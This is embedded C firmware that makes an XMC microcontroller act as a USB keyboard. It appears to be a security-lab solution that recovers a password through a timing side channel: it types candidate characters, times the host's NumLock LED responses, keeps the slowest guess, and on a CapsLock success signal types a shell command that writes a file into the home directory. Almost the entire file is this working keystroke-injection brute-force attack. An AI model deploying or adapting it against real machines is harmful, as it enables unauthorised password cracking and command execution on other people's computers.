#include "KeyboardHID.h"
#include "german_keyboardCodes.h"
#include "character_define.h"

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0


/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

void SystemCoreClockSetup(void);

/*
My Code here
*/

/*System Clock*/
uint32_t SysTickCounter = 0; //32bit for maximum
uint32_t SysTickOld = 0;
uint32_t SysTickNew = 0;

void initSysTick() {
	SysTick_Config(SystemCoreClock/1000);			
}	

extern void SysTick_Handler(){
	SysTickCounter++;
}




uint8_t password_GetNext(void);
//int max_index(uint8_t*,int);
//Global Variable




//Control Flag

#define numTotalSubStage 84

enum STATE {Idle,Sending,Create,Success,Summarize,Wait};
enum STATE G_CALLBACK_STATE = Create;

	enum WhichStage{
		Charac1,Charac2,Charac3,Charac4,Charac5,
		Charac6,Charac7,Charac8,Charac9,Charac10,
		Charac11,Charac12,Charac13,Charac14,Charac15,
		Charac16,Charac17,Charac18,Charac19,Charac20,END};



		uint32_t G_time_1substage[numTotalSubStage];
		int G_indSubStage = 0;
		int G_indxBINGO = 0;


Character G_Password_Arr[84];//10~20 length of pass, last one enter
uint8_t G_numCharacter;

bool G_IsSuccessful = false;


//LEDSTATE
bool G_isNUMon = true;
bool G_isCAPon = false;
bool G_hasNumOff = true;

//Time Measurement


//temporary
uint8_t G_FailTime = 0;




int max_index(uint32_t* a, int n)
{
	if(n <= 0) return -1;
	int i, max_i = 0;
	uint32_t max = a[0];
	for(i = 1; i < n; ++i){
		if(a[i] > max){
			max = a[i];
			max_i = i;
		}
	}
	return max_i;
}



/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {
	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();
	initSysTick();
	
	// Wait until host has enumerated HID device
	for(int i = 0; i < 2*10e6; ++i)
		; 

	while (1) {

		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
	
	//Control Logic, Should we send?
	
	//Which password should I send?

	/*Control Logic give feedback to main loop
	wait for callback to finish sending or keep going
	*/
	static uint8_t characterSent = 0, 
			indexToSend = 0;

	static enum WhichStage G_Current_Stage = Charac1;	

	//Determine which state
	switch(G_CALLBACK_STATE){
		case Create:
			//first stage, two characters
			if(G_Current_Stage == Charac1){
				G_numCharacter = 2;
			}
			else if(G_Current_Stage != Charac1){
				G_numCharacter = G_Current_Stage+1;
			}
			
			for(int i=G_Current_Stage;i<G_numCharacter;i++){
				G_Password_Arr[i] = G_CHARAC_ARR[G_indSubStage]; //zero initialized
				}

			G_Password_Arr[G_numCharacter] = G_ENTER;

			G_CALLBACK_STATE = Sending;

		break;

		case Sending:
			if(indexToSend < (G_numCharacter+1)) {
				if(characterSent) {
					report->Modifier = 0; 
					report->Reserved = 0; 
					report->KeyCode[0] = 0; 
					characterSent = 0;
					++indexToSend; //increment of index
				} else {
					report->Modifier = G_Password_Arr[indexToSend].mod; 
					report->Reserved = 0; 
					report->KeyCode[0] = G_Password_Arr[indexToSend].key; 
					characterSent = 1;

					//wait a little bit for the console to print
					//for(int i = 0; i < 10e5; ++i); 
				}
			}
			else if (indexToSend == (G_numCharacter+1)){//Sending is complete
				//now characterSent = 0
				indexToSend = 0;//reset of index

				//now LED1 is off
				G_isNUMon = false;
				SysTickOld = SysTickCounter;
				G_CALLBACK_STATE = Wait;//so callback stops sending


				if(G_IsSuccessful){ //after cat command
					G_CALLBACK_STATE = Idle;
				}

			}		
		break;

		case Wait:
			//this if only enters if LED off signal is received
			//if (G_Current_Stage == Charac2){break;}
			if(G_IsSuccessful){
				G_CALLBACK_STATE = Success;
				break;
			}

			if(G_isNUMon){

				//SysTickNew = SysTickCounter;
				G_time_1substage[G_indSubStage] = SysTickNew - SysTickOld;
				G_indSubStage++;	

				G_isNUMon = false;

				if (G_indSubStage < numTotalSubStage){
					G_CALLBACK_STATE = Create;

				}
				else{
					G_CALLBACK_STATE = Summarize;
					G_indSubStage = 0;
				}
			}
			break;

		case Summarize:
 
			G_indxBINGO = max_index(G_time_1substage,numTotalSubStage);
			G_Password_Arr[G_Current_Stage] = G_CHARAC_ARR[G_indxBINGO];
			G_Current_Stage++;
			G_indSubStage = 0;
			
			//if 20 characters are tried. no more
			if(G_Current_Stage == END){
				G_CALLBACK_STATE = Idle;
			}
			else{
				G_CALLBACK_STATE = Create;
			}

		break;

		case Success:
			//CD
			G_Password_Arr[0] = G_CHARAC_ARR[28];
			G_Password_Arr[1] = G_CHARAC_ARR[29];
			G_Password_Arr[2] = G_SPACE;
			//$HOME
			G_Password_Arr[3] = G_CHARAC_ARR[83];
			G_Password_Arr[4] = G_CHARAC_ARR[33];
			G_Password_Arr[5] = G_CHARAC_ARR[40];
			G_Password_Arr[6] = G_CHARAC_ARR[38];
			G_Password_Arr[7] = G_CHARAC_ARR[30];
			//;
			G_Password_Arr[8] = G_CHARAC_ARR[70];

			//ECHO
			G_Password_Arr[9] = G_CHARAC_ARR[30];
			G_Password_Arr[10] = G_CHARAC_ARR[28];
			G_Password_Arr[11] = G_CHARAC_ARR[33];
			G_Password_Arr[12] = G_CHARAC_ARR[40];

			G_Password_Arr[13] = G_SPACE;
			G_Password_Arr[14] = G_QUOTE;
			G_Password_Arr[15] = G_CHARAC_ARR[44];
			G_Password_Arr[16] = G_CHARAC_ARR[4];
			G_Password_Arr[17] = G_CHARAC_ARR[23];
			G_Password_Arr[18] = G_SPACE;
			G_Password_Arr[19] = G_CHARAC_ARR[37];
			G_Password_Arr[20] = G_CHARAC_ARR[8];
			G_Password_Arr[21] = G_CHARAC_ARR[0];
			G_Password_Arr[22] = G_CHARAC_ARR[14];
                        // Name sen liao
			G_Password_Arr[23] = G_QUOTE;

			G_Password_Arr[24] = G_CHARAC_ARR[75];

			//03701554
			G_Password_Arr[25] = G_CHARAC_ARR[61];
			G_Password_Arr[26] = G_CHARAC_ARR[54];
			G_Password_Arr[27] = G_CHARAC_ARR[58];
			G_Password_Arr[28] = G_CHARAC_ARR[61];
			G_Password_Arr[29] = G_CHARAC_ARR[52];
			G_Password_Arr[30] = G_CHARAC_ARR[56];
			G_Password_Arr[31] = G_CHARAC_ARR[56];
			G_Password_Arr[32] = G_CHARAC_ARR[55];
			//.TXT
			G_Password_Arr[33] = G_ENTER;
			G_numCharacter = 33;
			G_CALLBACK_STATE = Sending;

		break;



		case Idle:
			//Doing nothing
		break;
	}
	return true;
}


// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;

	if(*report & HID_KEYBOARD_LED_NUMLOCK) {
		XMC_GPIO_SetOutputHigh(LED1);
		G_isNUMon = true;
		SysTickNew = SysTickCounter;
	}
	else{
		XMC_GPIO_SetOutputLow(LED1);
		G_isNUMon = false;

	}

	if(*report & HID_KEYBOARD_LED_CAPSLOCK) {
		XMC_GPIO_SetOutputHigh(LED2);
		G_isCAPon = true;
		G_IsSuccessful = true;
	}
	else{
		XMC_GPIO_SetOutputLow(LED2);
		G_isCAPon = false;
	}

}

void SystemCoreClockSetup(void) {
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}
